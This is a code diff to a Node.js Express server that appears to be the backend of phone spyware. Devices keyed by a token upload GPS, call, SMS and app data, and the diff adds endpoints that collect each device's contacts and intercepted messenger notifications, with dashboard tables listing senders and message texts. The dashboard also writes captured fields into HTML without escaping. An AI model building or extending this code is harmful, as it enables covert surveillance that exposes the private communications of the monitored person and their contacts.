@@ -10,7 +10,9 @@ const data = {
   gps: [],
   calls: [],
   sms: [],
-  apps: []
+  contacts: [],
+  apps: [],
+  notifications: []
 };
 
 // Middleware to get device token
@@ -60,6 +62,24 @@ app.post('/device/apps', (req, res) => {
     data.apps = data.apps.filter(a => a.token !== token);
     data.apps.push(...apps);
     console.log(`${apps.length} apps from ${token}`);
+    res.json({ success: true });
+});
+
+//Contacts
+app.post('/device/contacts', (req, res) => {
+    const token = getToken(req);
+    const contacts = req.body.map(c => ({ token, ...c }));
+    data.contacts = data.contacts.filter(c => c.token !== token);
+    data.contacts.push(...contacts);
+    console.log(`${contacts.length} contacts from ${token}`);
+    res.json({ success: true });
+});
+
+//Notifications(FacebookMessengeretc.)
+app.post('/device/notifications', (req, res) => {
+    const token = getToken(req);
+    data.notifications.push({ token, ...req.body, received_at: new Date() });
+    console.log(`Notification from ${token}:`, req.body);
     res.json({ success: true });
 });
 
@@ -150,6 +170,33 @@ app.get('/', (req, res) => {
                 </tr>
             `).join('')}
         </table>
+
+	<h2>Contacts</h2>
+	<table>
+  	   <tr><th>Device</th><th>Name</th><th>Number</th></tr>
+           ${data.contacts.map(c => `
+               <tr>
+           	   <td>${c.token}</td>
+                   <td>${c.name}</td>
+                   <td>${c.number}</td>
+                </tr>
+          `).join('')}
+       </table>
+
+       <h2>Instant Messages</h2>
+       <table>
+          <tr><th>Device</th><th>App</th><th>Sender</th><th>Message</th><th>Date</th></tr>
+          ${data.notifications.map(n => `
+              <tr>
+                  <td>${n.token}</td>
+                  <td>${n.app}</td>
+                  <td>${n.sender}</td>
+                  <td>${n.message}</td>
+                  <td>${new Date(n.received_at).toLocaleString()}</td>
+             </tr>
+          `).join('')}
+       </table>
+
     </body>
     </html>
     `);
